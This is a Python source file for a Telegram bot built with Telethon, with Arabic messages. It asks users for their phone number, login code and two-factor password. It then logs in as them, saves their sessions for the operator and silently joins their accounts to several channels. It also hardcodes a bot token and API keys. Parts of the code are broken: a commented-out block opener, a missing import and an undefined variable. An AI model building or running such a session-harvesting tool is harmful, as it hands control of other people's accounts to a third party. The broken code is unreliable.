from telethon import TelegramClient, events, Button, errors
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.auth import SendCodeRequest
from telethon.sessions import StringSession
import asyncio, json, os, re

# bot session
token = "6109895485:AAE43imQ2y0W_yDx5B_Fsdod_SWt7MyrKQg"
api_id_bot = 25230422
api_hash_bot = "ade18a444a3ca95930a9e5a6a6d8ecb5"
bot = TelegramClient("Bot", api_id_bot, api_hash_bot).start(bot_token=token)

# needs
owner_id = [6699312679]
collect, bots_to_collect, start_earn = True, [], False

# LOAD SESSION
sessions = json.load(open("sessions/sessions.json"))

# NEW USERS TO JSON
async def ToJson(user, path):
    with open(path, 'w') as file:
        json.dump(user, file)

# points
points = 1000

# user info
api_id = 25230422
api_hash = "ade18a444a3ca95930a9e5a6a6d8ecb5"

# ADD NEW NUMBER
async def Add_NUMBER(event, api_id, api_hash, phone_number):
    try:
        phone_number = phone_number.replace('+', '').replace(' ', '')
        iqthon = TelegramClient("sessions/"+phone_number+".session", api_id, api_hash)
        await iqthon.connect()

        if not await iqthon.is_user_authorized():
            request = await iqthon.send_code_request(phone_number)
            
            ## async with bot.conversation(event.chat_id, timeout=300) as conv:
                
                code_type = {
                    SentCodeType.APP: 'تطبيق التليجرام',
                    SentCodeType.CALL: 'مكالمه صوتيه',
                    SentCodeType.FLASH_CALL: 'مكالمه سريعه',
                    SentCodeType.SMS: 'رسائل الهاتف',
                    SentCodeType.EMAIL_CODE: 'البريد الالكتروني',
                    SentCodeType.FRAGMENT_SMS: 'التسجيل الوهمي',
                }[code.type]

                # verification code
                verification_message = (
                    f"**- تم إرسال كود التحقق عبر *{code_type}*"
                    f"\n من فضلك قم بإرساله ووضع ( - ) بين كل رقم."
                    f"\n انتظر ⏳ :**"
                )
                try:
                    verification_code_msg = await conv.send_message(verification_message)
                    response_verification_code = await conv.get_response()
                    verification_code = str(response_verification_code.message).replace('-', '')

                except Exception as error:
                    return str(error)
                try:
                    login = await iqthon.sign_in(phone_number, code=int(verification_code))
                except errors.SessionPasswordNeededError:
                    password_msg = await conv.send_message("الحساب محمي بكلمة السر, ارسل كلمة السر :")
                    password = await conv.get_response()

                    login = await iqthon.sign_in(phone_number, password=password.text)

                # انضمام إلى القنوات (إذا كان ذلك مطلوبًا)
                try:
                    await iqthon(JoinChannelRequest('ALRAGI1'))
                    await iqthon(JoinChannelRequest('YY2PP'))
                    await iqthon(JoinChannelRequest('YB_13'))
                    await iqthon(JoinChannelRequest('YYNXX7'))
                except:
                    pass

                # إضافة المعلومات إلى ملف JSON
                count = f"session_{phone_number}"
                New_item = {count: {"phone": phone_number, "api_id": api_id, "api_hash": api_hash}}
                sessions.update(New_item)

                await ToJson(sessions, "sessions/sessions.json")

                return "تم اضافة الرقم بنجاح"
    except Exception as error:
        return str(error)

# KEYBOARD
async def StartButtons(event, role):
    buttons = []

    if role == 2:
        buttons.append([Button.inline("اضف رقم", "add_number")])
        buttons.append([Button.inline("تعيين النقاط", "set_points")])
    elif role == 1:
        buttons.append([Button.inline("اضف رقم", "add_number")])
        buttons.append([Button.inline("حذف رقم", "remove_number")])
        buttons.append([Button.inline("تعيين النقاط", "set_points")])

    await event.reply("**لاضافة حساب اضغط على الزر بالأسفل لبدأ عملية اضافة الارقام.\n [مطور البوت](https://t.me/yynxx)** ", buttons=buttons)

#...

@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# DELETE NUMBER TELEGRAM BOT
@bot.on(events.CallbackQuery(data="remove_number"))
async def Callbacks_(event):
    global sessions

    delete, sessions, in_session = await event.delete(), json.load(open("sessions/sessions.json")), False
    try:
        async with bot.conversation(event.chat_id, timeout=200) as conv:
            # verification code
            get_number= await conv.send_message("**ارسل الرقم  الذي تريد حذفه ❓. **")
            remove_number = await conv.get_response()
            remove_number = (remove_number.text).replace('+', '').replace(' ', '')
            for session in sessions:
                session_number = sessions.get(session).get("phone")
                if remove_number == session_number:
                    del sessions[session]
                    await ToJson(sessions, "sessions/sessions.json")
                    in_session = True
                    break

    except Exception as error:
        print(error)

    if in_session == True:
        await event.reply("**- تم حذف الرقم بنجاح ✅. **")
        sessions = json.load(open("sessions/sessions.json"))
    else:
        await event.reply("**- هذا الرقم غير موجود ⛔. **")

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

# تعريف متغير لعدد الجلسات
session_count = len(sessions)  # حيث أن sessions هو قائمة تحتوي على الجلسات الحالية

@bot.on(events.NewMessage)
async def handle_message(event):
    if event.chat_id in owner_id:
        if ".عدد الحسابات" in event.text:
            await event.reply(f"عدد الحسابات الحالية هو: {session_count}")

# ADD NUMBER TELEGRAM BOT INFORMATION
@bot.on(events.CallbackQuery(data="add_number"))
async def Callbacks(event):

    await event.delete()
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:

            await conv.send_message('**- ارسل رقم الهاتف مع رمز الدولة📳. \n- كمثال 👈🏼:  +3584573989131**')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text

            await conv.send_message(f'''
**Api id :** `{api_id}`
**Api hash :** `{api_hash}`
**Phone number :** `{phone_number_msg}`

**جاري تسجيل الدخول 👨🏽‍💻🔄**
''')

        result = await Add_NUMBER(event, int(api_id), api_hash, phone_number_msg)
        await event.reply(result)
    except Exception as error:
        pass

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)


@bot.on(events.CallbackQuery(data="set_points"))
async def set_points_callback(event):
    global sessions

    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message("**- الرجاء إدخال عدد النقاط المطلوبة (بين 1000 و 5000 نقطة):**")
        point_msg = await conv.get_response()
        point = point_msg.text.strip()

        try:
            points = int(point)
            if 1000 <= points <= 5000:
                # هنا يمكنك إجراء إجراءات إضافية على أساس النقاط المعينة
                await conv.send_message(f"**- تم تثبيت تجميع النقاط على العدد {points} بنجاح ✅.**")
            else:
                await conv.send_message("**- لقد فشلت عملية تعيين النقاط ❓\n الرجاء التأكد من أن الرقم المدخل عدد صحيح وواقع بين الرقم 1000 والرقم 5000 ثم حاول مرة أخرى.**")
        except ValueError:
            await conv.send_message("**- فشل في تعيين النقاط. الرجاء إدخال عدد صحيح فقط❌.**")

    if event.chat_id in owner_id:
        await StartButtons(event, 1)
    else:
        await StartButtons(event, 2)

#...

# تشغيل العميل
bot.start()
bot.run_until_disconnected()
